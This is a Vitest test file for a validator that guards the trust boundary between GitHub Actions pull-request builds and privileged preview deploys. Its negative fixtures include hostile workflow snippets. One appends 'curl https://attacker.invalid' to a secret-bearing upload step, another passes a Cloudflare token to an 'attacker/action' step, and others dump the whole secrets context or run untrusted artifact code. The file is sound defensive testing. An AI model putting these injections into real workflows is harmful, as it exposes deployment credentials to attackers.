import { readFile } from "node:fs/promises";
import { describe, expect, test } from "vitest";

import { assertPreviewWorkflowTrust } from "./assert-preview-workflow-trust.mjs";

describe("preview workflow trust boundary", () => {
  test("keeps PR execution credential-free and deployment tooling on main", async () => {
    const [buildWorkflow, deployWorkflow] = await Promise.all([
      readFile(".github/workflows/build-preview.yml", "utf8"),
      readFile(".github/workflows/deploy-preview.yml", "utf8"),
    ]);

    expect(() => assertPreviewWorkflowTrust({ buildWorkflow, deployWorkflow })).not.toThrow();
  });

  test("rejects a pull-request workflow that references secrets", () => {
    const buildWorkflow = `on: { pull_request: {} }\njobs:\n  build:\n    steps:\n      - run: echo \${{ secrets.CLOUDFLARE_API_TOKEN }}`;
    const deployWorkflow = `on: { workflow_run: { workflows: [Build Preview Artifact], types: [completed] } }\njobs:\n  deploy:\n    steps:\n      - uses: actions/checkout@pinned\n        with: { ref: main }`;
    expect(() => assertPreviewWorkflowTrust({ buildWorkflow, deployWorkflow })).toThrow(
      "must not reference secrets",
    );
  });

  test("rejects shell tar packaging that fails on dangling dependency links", async () => {
    const deployWorkflow = await readFile(".github/workflows/deploy-preview.yml", "utf8");
    const buildWorkflow = `on: { pull_request: {} }
jobs:
  build:
    steps:
      - run: tar --dereference --hard-dereference --create --file preview-worker.tar .open-next`;

    expect(() => assertPreviewWorkflowTrust({ buildWorkflow, deployWorkflow })).toThrow(
      "must use the safe preview artifact packager",
    );
  });

  test("rejects privileged extraction that can overwrite the trusted checkout", () => {
    const buildWorkflow = `on: { pull_request: {} }\njobs: { build: { steps: [{ run: "python3 scripts/package-preview-artifact.py .open-next preview-worker.tar" }] } }`;
    const deployWorkflow = `on: { workflow_run: { workflows: [Build Preview Artifact] } }
jobs:
  deploy:
    steps:
      - uses: actions/checkout@pinned
        with: { ref: main, persist-credentials: false }
      - run: |
          python3 - <<'PY'
          import tarfile
          tarfile.open("preview-worker.tar").extractall(".", filter="data")
          PY`;

    expect(() => assertPreviewWorkflowTrust({ buildWorkflow, deployWorkflow })).toThrow(
      "exact trusted preview artifact extraction",
    );
  });

  test("rejects build archives that bypass the safe packager", () => {
    const buildWorkflow = `on: { pull_request: {} }
jobs:
  build:
    steps:
      - run: tar --create --file preview-worker.tar .open-next`;
    const deployWorkflow = `on: { workflow_run: { workflows: [Build Preview Artifact] } }
jobs:
  deploy:
    steps:
      - uses: actions/checkout@pinned
        with: { ref: main }
      - run: python3 scripts/extract-preview-artifact.py preview-worker.tar .`;

    expect(() => assertPreviewWorkflowTrust({ buildWorkflow, deployWorkflow })).toThrow(
      "must use the safe preview artifact packager",
    );
  });

  test("rejects a preview smoke step that receives a secret", () => {
    const buildWorkflow = `on: { pull_request: {} }\njobs: { build: { steps: [{ run: "python3 scripts/package-preview-artifact.py .open-next preview-worker.tar" }] } }`;
    const deployWorkflow = `on: { workflow_run: { workflows: [Build Preview Artifact] } }
jobs:
  deploy:
    steps:
      - uses: actions/checkout@0123456789012345678901234567890123456789
        with: { ref: main, persist-credentials: false }
      - run: python3 scripts/extract-preview-artifact.py preview-worker.tar .
      - run: pnpm test:cf-deployment
        env:
          HEALTHCHECK_TOKEN: \${{ secrets.PREVIEW_HEALTHCHECK_TOKEN }}`;

    expect(() => assertPreviewWorkflowTrust({ buildWorkflow, deployWorkflow })).toThrow(
      "preview smoke must not receive secrets",
    );
  });

  test("rejects secret-bearing third-party action steps", () => {
    const buildWorkflow = `on: { pull_request: {} }\njobs: { build: { steps: [{ run: "python3 scripts/package-preview-artifact.py .open-next preview-worker.tar" }] } }`;
    const deployWorkflow = `on: { workflow_run: { workflows: [Build Preview Artifact] } }
jobs:
  deploy:
    steps:
      - uses: actions/checkout@0123456789012345678901234567890123456789
        with: { ref: main, persist-credentials: false }
      - run: python3 scripts/extract-preview-artifact.py preview-worker.tar .
      - uses: attacker/action@0123456789012345678901234567890123456789
        env:
          TOKEN: \${{ secrets.CLOUDFLARE_API_TOKEN }}`;

    expect(() => assertPreviewWorkflowTrust({ buildWorkflow, deployWorkflow })).toThrow(
      "secret-bearing action is not allowed",
    );
  });

  test("rejects unpinned third-party actions", async () => {
    const [buildWorkflow, trustedDeployWorkflow] = await Promise.all([
      readFile(".github/workflows/build-preview.yml", "utf8"),
      readFile(".github/workflows/deploy-preview.yml", "utf8"),
    ]);
    const deployWorkflow = trustedDeployWorkflow.replace(
      /actions\/checkout@[0-9a-f]{40}/,
      "actions/checkout@main",
    );

    expect(() => assertPreviewWorkflowTrust({ buildWorkflow, deployWorkflow })).toThrow(
      "must pin third-party actions",
    );
  });

  test("rejects artifact downloads not bound to the triggering run", async () => {
    const [buildWorkflow, trustedDeployWorkflow] = await Promise.all([
      readFile(".github/workflows/build-preview.yml", "utf8"),
      readFile(".github/workflows/deploy-preview.yml", "utf8"),
    ]);
    const deployWorkflow = trustedDeployWorkflow.replace(
      "run-id: ${{ github.event.workflow_run.id }}",
      "run-id: 123",
    );

    expect(() => assertPreviewWorkflowTrust({ buildWorkflow, deployWorkflow })).toThrow(
      "must bind the artifact to workflow_run.id",
    );
  });

  test("rejects extra commands appended to the secret-bearing upload", async () => {
    const [buildWorkflow, trustedDeployWorkflow] = await Promise.all([
      readFile(".github/workflows/build-preview.yml", "utf8"),
      readFile(".github/workflows/deploy-preview.yml", "utf8"),
    ]);
    const deployWorkflow = trustedDeployWorkflow.replace(
      "--var RELEASE_SHA:${{ env.PR_HEAD_SHA }}",
      "--var RELEASE_SHA:${{ env.PR_HEAD_SHA }} && curl https://attacker.invalid",
    );

    expect(() => assertPreviewWorkflowTrust({ buildWorkflow, deployWorkflow })).toThrow(
      "secret-bearing steps must be trusted",
    );
  });

  test("rejects generic Cloudflare credentials in the preview deployer", async () => {
    const [buildWorkflow, trustedDeployWorkflow] = await Promise.all([
      readFile(".github/workflows/build-preview.yml", "utf8"),
      readFile(".github/workflows/deploy-preview.yml", "utf8"),
    ]);
    const deployWorkflow = trustedDeployWorkflow
      .replaceAll("PREVIEW_CLOUDFLARE_ACCOUNT_ID", "CLOUDFLARE_ACCOUNT_ID")
      .replaceAll("PREVIEW_CLOUDFLARE_API_TOKEN", "CLOUDFLARE_API_TOKEN");

    expect(() => assertPreviewWorkflowTrust({ buildWorkflow, deployWorkflow })).toThrow(
      "preview-specific Cloudflare credentials",
    );
  });

  test("rejects bracket-form secret references", async () => {
    const [buildWorkflow, trustedDeployWorkflow] = await Promise.all([
      readFile(".github/workflows/build-preview.yml", "utf8"),
      readFile(".github/workflows/deploy-preview.yml", "utf8"),
    ]);
    const deployWorkflow = trustedDeployWorkflow.replace(
      "          GITHUB_SHA: ${{ env.PR_HEAD_SHA }}",
      "          GITHUB_SHA: ${{ env.PR_HEAD_SHA }}\n          TOKEN: \"${{ secrets['TOKEN'] }}\"",
    );

    expect(() => assertPreviewWorkflowTrust({ buildWorkflow, deployWorkflow })).toThrow(
      "preview smoke must not receive secrets",
    );
  });

  test("rejects access to the complete secrets context", async () => {
    const [buildWorkflow, trustedDeployWorkflow] = await Promise.all([
      readFile(".github/workflows/build-preview.yml", "utf8"),
      readFile(".github/workflows/deploy-preview.yml", "utf8"),
    ]);
    const deployWorkflow = trustedDeployWorkflow.replace(
      "          GITHUB_SHA: ${{ env.PR_HEAD_SHA }}",
      "          GITHUB_SHA: ${{ env.PR_HEAD_SHA }}\n          ALL_SECRETS: ${{ toJSON(secrets) }}",
    );

    expect(() => assertPreviewWorkflowTrust({ buildWorkflow, deployWorkflow })).toThrow(
      "preview smoke must not receive secrets",
    );
  });

  test("rejects local actions that could be sourced from the artifact", async () => {
    const [buildWorkflow, trustedDeployWorkflow] = await Promise.all([
      readFile(".github/workflows/build-preview.yml", "utf8"),
      readFile(".github/workflows/deploy-preview.yml", "utf8"),
    ]);
    const deployWorkflow = trustedDeployWorkflow.replace(
      "      - name: Upload preview version",
      "      - uses: ./.open-next/untrusted-action\n      - name: Upload preview version",
    );

    expect(() => assertPreviewWorkflowTrust({ buildWorkflow, deployWorkflow })).toThrow(
      "must not use local actions",
    );
  });

  test("rejects commands appended to artifact extraction", async () => {
    const [buildWorkflow, trustedDeployWorkflow] = await Promise.all([
      readFile(".github/workflows/build-preview.yml", "utf8"),
      readFile(".github/workflows/deploy-preview.yml", "utf8"),
    ]);
    const deployWorkflow = trustedDeployWorkflow.replace(
      'mv "$PREVIEW_EXTRACT_DIR/.open-next" .open-next',
      'mv "$PREVIEW_EXTRACT_DIR/.open-next" .open-next\n          node .open-next/worker.js',
    );

    expect(() => assertPreviewWorkflowTrust({ buildWorkflow, deployWorkflow })).toThrow(
      "exact trusted preview artifact extraction",
    );
  });
});
